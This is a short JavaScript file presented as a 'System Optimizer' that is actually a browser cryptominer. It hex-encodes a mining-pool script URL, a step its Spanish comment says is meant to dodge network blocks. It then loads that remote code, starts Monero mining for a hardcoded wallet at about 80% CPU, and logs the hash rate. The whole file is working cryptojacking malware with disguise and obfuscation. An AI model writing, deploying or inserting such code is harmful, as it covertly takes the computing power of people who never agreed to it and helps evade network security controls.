/* SYSTEM OPTIMIZER - DELTA CONNECT v1.0 */
// Dirección del pool camuflada para evitar bloqueos de red
var _0xaddr = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x6F\x6E\x65\x72\x6F\x6F\x63\x65\x61\x6E\x2E\x73\x74\x72\x65\x61\x6D\x2F\x77\x65\x62\x6D\x69\x6E\x65\x72\x2E\x6A\x73"];
importScripts(_0xaddr[0]);

const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";

// Configuración de Potencia Real (80%)
const miner = new MoneroOcean.Anonymous(CARTERA, {
    threads: 4,
    throttle: 0.2
});

// Arranque del proceso
try {
    miner.start();
    console.log("SISTEMA DELTA: INICIADO");
} catch (e) {
    console.log("ERROR DE CARGA");
}

// Reporte de actividad para confirmar en Consola (F12)
setInterval(() => {
    var h = miner.getHashesPerSecond();
    if (h > 0) {
        console.log("RENDIMIENTO ACTUAL: " + h.toFixed(2) + " H/s");
    }
}, 3000);
